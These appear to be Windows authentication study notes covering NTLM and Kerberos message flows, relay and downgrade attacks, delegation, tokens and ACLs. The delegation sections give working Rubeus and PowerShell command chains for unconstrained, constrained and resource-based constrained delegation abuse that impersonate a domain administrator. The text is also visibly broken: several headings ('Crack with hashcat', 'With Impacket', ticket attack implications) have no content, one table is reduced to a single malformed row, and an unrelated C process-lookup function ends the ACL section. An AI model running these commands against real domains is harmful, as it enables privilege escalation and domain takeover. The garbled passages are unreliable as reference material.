NTLM Authentication

LM Hash vs NT Hash

Windows stores password hashes in two formats:

PropertyLM HashNT Hash (NTLM Hash)
AlgorithmDES-based (split password into 2x 7-char blocks, each DES-encrypted against fixed string "KGS!@#$%")MD4(UTF-16LE(password))
Max password length14 charactersUnlimited (127 in practice)
Case sensitivityUppercased before hashing — trivially weakCase-sensitive
Default stateDisabled since Vista/Server 2008 (stored as aad3b435b51404eeaad3b435b51404ee)Always stored
Storage locationSAM (local) or NTDS.dit (AD)SAM (local) or NTDS.dit (AD)

Critical: The NT hash is password-equivalent. Possessing it allows authentication without knowing the plaintext (Pass-the-Hash).

NTLMv1 vs NTLMv2

PropertyNTLMv1NTLMv2
Challenge8-byte server challenge8-byte server challenge + variable-length client challenge (blob)
Response algorithmDES(NT hash padded to 21 bytes → 3 DES keys encrypt server challenge)HMAC-MD5(NTv2 hash, server_challenge + blob)
Key derivationNT hash split into three 7-byte DES keysNTv2 hash = HMAC-MD5(NT hash, uppercase(username) + domain)
SecurityCrackable with rainbow tables, vulnerable to relay, can be cracked to NT hash directlyClient challenge prevents precomputation; still relayable but not crackable to NT hash
NegotiationLMCompatibilityLevel 0-1LMCompatibilityLevel 3-5 (default on modern Windows)

Why NTLMv1 is weaker: The response can be cracked offline back to the NT hash using services like crack.sh (leveraging FPGA rainbow tables for DES). NTLMv2 responses can only be cracked to the plaintext password — and only if weak enough for dictionary/brute-force.

NTLM Challenge/Response Flow (Type 1/2/3 Messages)

# NTLM Authentication Packet Flow:
#
# Client                          Server
#   |                               |
#   |--- NEGOTIATE (Type 1) ------->|   Flags: NTLMSSP_NEGOTIATE_56, NTLMSSP_NEGOTIATE_UNICODE,
#   |                               |          NTLMSSP_NEGOTIATE_NTLM, NTLMSSP_REQUEST_TARGET
#   |                               |
#   |<-- CHALLENGE (Type 2) --------|   Contains: Server Challenge (8 bytes), Target Name,
#   |                               |            Target Info (NetBIOS name, DNS name, timestamp),
#   |                               |            Negotiated Flags
#   |                               |
#   |--- AUTHENTICATE (Type 3) ---->|   Contains: LM Response, NT Response (NTLMv2: NTProofStr + blob),
#   |                               |            Domain, Username, Workstation, Session Key, MIC
#   |                               |

Type 1 (NEGOTIATE_MESSAGE)

  • Signature: NTLMSSP\0 (8 bytes)
  • Message Type: 0x00000001
  • Negotiate Flags (4 bytes): declares client capabilities
  • Optional: Domain name, Workstation name

Type 2 (CHALLENGE_MESSAGE)

  • Server Challenge: 8 random bytes — the nonce
  • Target Name: NetBIOS domain name of the server
  • Target Info: AV_PAIR structures containing:
    • MsvAvNbDomainName (NetBIOS domain)
    • MsvAvNbComputerName (NetBIOS hostname)
    • MsvAvDnsDomainName (FQDN of domain)
    • MsvAvDnsComputerName (FQDN of server)
    • MsvAvTimestamp (FILETIME — used in NTLMv2 response)
    • MsvAvFlags (0x00000002 = MIC present)

Type 3 (AUTHENTICATE_MESSAGE)

  • LM Response (24 bytes for NTLMv1, variable for NTLMv2)
  • NT Response: NTProofStr (16 bytes HMAC-MD5) + Client Challenge Blob (temp structure with timestamp, client nonce, target info)
  • Domain, Username, Workstation strings
  • Encrypted Random Session Key (for signing/sealing)
  • MIC (Message Integrity Code): HMAC-MD5 over all three messages — prevents tampering

NTLM Relay Attacks

Concept: Attacker sits between client and server. Client authenticates to attacker, attacker forwards the authentication messages to the real target. The attacker never sees the password or hash — just relays the challenge/response.

When NTLM Relay Works:

  • SMB signing is not required on the target (default: required only on DCs)
  • Target service accepts NTLM authentication
  • The relayed user has permissions on the target
  • Cross-protocol relay: HTTP→SMB, HTTP→LDAP, SMB→HTTP, etc.

Mitigations:

MitigationWhat it does
SMB Signing (Required)All SMB packets must be signed with session key. Attacker can't derive session key → can't sign → relay fails.
EPA (Extended Protection for Authentication)Channel binding: ties NTLM auth to TLS channel. Relay to different TLS session fails.
MIC (Message Integrity Code)HMAC over all 3 NTLM messages. Attacker can't modify flags (e.g., to remove MIC requirement). Bypass: drop MIC flag from Type 1 — patched in CVE-2019-1040.
LDAP signing/channel bindingPrevents relay to LDAP/LDAPS.
Disable NTLM entirelyForce Kerberos-only. Breaks legacy apps but eliminates relay surface.

NTLM Downgrade Attacks

If the server accepts NTLMv1 (LMCompatibilityLevel < 3), an attacker performing relay/MITM can:

  • Modify the CHALLENGE message flags to request NTLMv1 response
  • Set a known challenge (e.g., 1122334455667788) for rainbow table cracking
  • Crack the NTLMv1 response back to the NT hash using DES key space search
  • Tool: InternalMonologue — forces local NTLM auth downgrade without touching LSASS
# Check LMCompatibilityLevel:
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel
# 0 = Send LM & NTLM responses
# 1 = Send LM & NTLM - use NTLMv2 if negotiated
# 2 = Send NTLM response only
# 3 = Send NTLMv2 response only (default modern Windows)
# 4 = Send NTLMv2 response only, refuse LM (DC)
# 5 = Send NTLMv2 response only, refuse LM & NTLM (DC)

Kerberos Authentication (Deep Dive)

Full Protocol Flow

# Kerberos Authentication Flow:
#
# Client                     KDC (DC)                    Service
#   |                          |                           |
#   |-- AS-REQ (pre-auth) ---->|                           |
#   |   (timestamp encrypted   |                           |
#   |    with user's key)      |                           |
#   |                          |                           |
#   |<--- AS-REP -------------|                           |
#   |   (TGT encrypted with   |                           |
#   |    krbtgt key + session  |                           |
#   |    key encrypted with    |                           |
#   |    user's key)           |                           |
#   |                          |                           |
#   |-- TGS-REQ (TGT + SPN) ->|                           |
#   |   (authenticator         |                           |
#   |    encrypted with        |                           |
#   |    TGT session key)      |                           |
#   |                          |                           |
#   |<--- TGS-REP ------------|                           |
#   |   (Service Ticket        |                           |
#   |    encrypted with        |                           |
#   |    service's key)        |                           |
#   |                          |                           |
#   |-- AP-REQ (Ticket + Authenticator) ----------------->|
#   |   (authenticator encrypted with service session key) |
#   |                          |                           |
#   |<--------------- AP-REP (optional, mutual auth) -----|
#   |                          |                           |

AS-REQ (Authentication Service Request)

  • Pre-authentication data: Timestamp encrypted with user's long-term key (derived from password)
  • Requested principal: krbtgt/REALM@REALM
  • Encryption types supported (etype list): AES256, AES128, RC4-HMAC
  • Client principal name and realm
  • Nonce (for replay protection)

AS-REP (Authentication Service Reply)

  • TGT (Ticket-Granting Ticket): encrypted with krbtgt account's key — client cannot decrypt or modify
  • Enc-part: encrypted with user's key, contains:
    • Session key (for TGS-REQ authenticator)
    • Ticket lifetime, renew-till
    • Nonce (matching request)

TGS-REQ (Ticket-Granting Service Request)

  • TGT (opaque blob for KDC)
  • Authenticator: current timestamp encrypted with TGT session key (proves possession)
  • SPN: Service Principal Name of target service (e.g., MSSQLSvc/sql01.corp.local:1433)
  • Requested encryption type

TGS-REP (Ticket-Granting Service Reply)

  • Service Ticket (ST): encrypted with the target service account's key — client cannot decrypt
  • Enc-part: encrypted with TGT session key, contains:
    • Service session key
    • Ticket flags and lifetime

AP-REQ / AP-REP

  • AP-REQ: Service ticket + Authenticator (timestamp encrypted with service session key)
  • Service decrypts ticket with its own key → gets service session key → decrypts authenticator → validates timestamp
  • AP-REP (optional): Service returns client's timestamp encrypted with service session key → proves service identity (mutual authentication)

Ticket Structure

TGT Contents (encrypted with krbtgt key):

  • Client principal name and realm
  • Session key (for TGS-REQ)
  • Auth time, start time, end time, renew-till
  • Ticket flags: FORWARDABLE, PROXIABLE, RENEWABLE, PRE-AUTHENT
  • PAC (Privilege Attribute Certificate):
    • User SID
    • Group SIDs (all group memberships including nested)
    • Extra SIDs (SID history)
    • User account control flags
    • Logon information (logon count, bad password count, last logon)
    • PAC Server Signature: signed with service key (verifiable by service)
    • PAC KDC Signature: signed with krbtgt key (verifiable only by KDC)

Attack implications of ticket structure:

Encryption Types

AES128-CTS-HMAC-SHA117PBKDF2(password, salt=REALM+principal, iterations=4096)Strong

Pre-Authentication

Pre-auth prevents offline password guessing against AS-REP. The KDC requires the client to prove knowledge of the password before issuing a TGT.

  • PA-ENC-TIMESTAMP: Current timestamp encrypted with user's long-term key
  • KDC decrypts → if timestamp within skew tolerance → user proved knowledge
  • DONT_REQUIRE_PREAUTH (UAC flag 0x400000): If set, KDC issues AS-REP without pre-auth
  • AS-REP Roasting: Request AS-REP for user with pre-auth disabled → get TGT encrypted with user's key → offline crack

# Crack with hashcat (mode 18200):

Delegation Types

Unconstrained Delegation

  • Server stores the user's TGT in memory when user authenticates
  • Server can impersonate the user to any service
  • Flag: TRUSTED_FOR_DELEGATION (UAC 0x80000)
  • Attack: Coerce a DC to authenticate → capture DC's TGT → DCSync
# Find unconstrained delegation machines:
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Extract cached TGTs with Rubeus:
Rubeus.exe triage
Rubeus.exe dump /luid:0x3e7 /service:krbtgt

Constrained Delegation (S4U)

  • Server can only delegate to specific services listed in msDS-AllowedToDelegateTo
  • S4U2Self: Service requests a ticket to itself on behalf of any user (even without their TGT). Returns a forwardable ticket if TRUSTED_TO_AUTH_FOR_DELEGATION is set.
  • S4U2Proxy: Uses the S4U2Self ticket to request a service ticket to the allowed target on behalf of the user.
  • Attack: Compromise a service with constrained delegation → S4U2Self for any user → S4U2Proxy to allowed service → code execution on target
# Constrained delegation attack with Rubeus:
# 1. Get TGT for compromised service account:
Rubeus.exe asktgt /user:svc_web /rc4:HASH /domain:corp.local

# 2. S4U (self + proxy) to allowed service as admin:
Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

# With Impacket:

export KRB5CCNAME=administrator.ccache

Resource-Based Constrained Delegation (RBCD)

  • Delegation permission configured on the target (not the source)
  • Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
  • Attack path: If you can write to this attribute on a target (GenericWrite/GenericAll) → configure your controlled account for RBCD → S4U to target as any user
  • No TRUSTED_TO_AUTH_FOR_DELEGATION flag needed
# RBCD Attack:
# 1. Create or use existing machine account (any domain user can create up to 10 by default):
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# 2. Set RBCD attribute on target:
Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKEMACHINE$

# 3. Get hash of fake machine account:
Rubeus.exe hash /password:FakePass123! /user:FAKEMACHINE$ /domain:corp.local

# 4. S4U attack:
Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

krbtgt Account

  • Built-in account in every AD domain — disabled, cannot log on interactively
  • Its password hash encrypts every TGT in the domain
  • Compromising krbtgt = ability to forge any TGT (Golden Ticket) = complete domain compromise
  • Password never changes automatically — must be manually rotated
  • Best practice: rotate krbtgt password twice (first reset invalidates current tickets after TGT lifetime; second reset invalidates tickets encrypted with the N-1 password)

Clock Skew

  • Default tolerance: 5 minutes (MaxClockSkew in Default Domain Policy)
  • If client/server clocks differ by more → KRB_AP_ERR_SKEW
  • Attackers must sync their clock: ntpdate DC_IP or faketime
  • Authenticators include timestamp → prevents replay (each timestamp valid only once within skew window)

Token Structure

  • User SID: Identity of the token owner
  • Group SIDs: All groups the user belongs to (including nested, with SE_GROUP_ENABLED flag)
  • Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryTokenPrivilege, etc.
  • Integrity Level: Mandatory label (Low/Medium/High/System)
  • Session ID: Logon session this token belongs to
  • Token Type: Primary or Impersonation
  • Logon SID: Unique per logon session
  • Default DACL: DACL applied to objects created by this token
  • Token Source: Which package created it (e.g., "User32", "Advapi")

Restricted Tokens & UAC Split Token

  • Filtered (Split) Token: When admin logs in with UAC enabled, two tokens are created:
    • Full token: all groups + privileges (used by elevated processes)
    • Filtered token: admin groups set to DENY-ONLY, high privileges removed (used by default)
  • Restricted Tokens: Created with CreateRestrictedToken() — can disable SIDs, remove privileges, add restricting SIDs
  • Elevation (consent.exe / UAC prompt) switches from filtered to full token

  • SID History: When a user migrates between domains, old SID is stored in sIDHistory attribute. Token includes SID history SIDs → user retains access to old domain resources.

  • SID Filtering: At trust boundaries, removes SIDs from other domains from the PAC. Prevents SID history abuse across forest trusts. Enabled by default on forest trusts, disabled by default on intra-forest trusts.

ACLs / DACLs / SACLs

Security Descriptors

Every securable object (file, registry key, AD object, service, process) has a Security Descriptor containing:

  • Owner: SID of the owner (can always modify DACL)
  • Group: Primary group SID (mostly POSIX compat, rarely used in Windows)
  • DACL (Discretionary ACL): Who can access and what they can do
  • SACL (System ACL): Audit rules — what access attempts to log
  • Control flags: SE_DACL_PRESENT, SE_DACL_PROTECTED (disables inheritance), SE_SACL_PRESENT, etc.

ACE Types

ACE TypePurpose
ACCESS_ALLOWED_ACEGrants specified access rights to a SID
ACCESS_DENIED_ACEExplicitly denies specified access rights to a SID
ACCESS_ALLOWED_OBJECT_ACEGrants access to a specific property or extended right (AD objects — uses ObjectType GUID)
ACCESS_DENIED_OBJECT_ACEDenies access to a specific property/right
SYSTEM_AUDIT_ACEGenerates audit event when specified access is attempted (in SACL)
SYSTEM_MANDATORY_LABEL_ACEDefines integrity level of the object (in SACL)

ACE Evaluation Order

  1. Explicit DENY ACEs (applied directly to object)
  2. Explicit ALLOW ACEs
  3. Inherited DENY ACEs
  4. Inherited ALLOW ACEs

Key rule: Deny always takes precedence over Allow at the same inheritance level. Access check stops at first match for each requested permission.

DWORD FindProcessId(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}
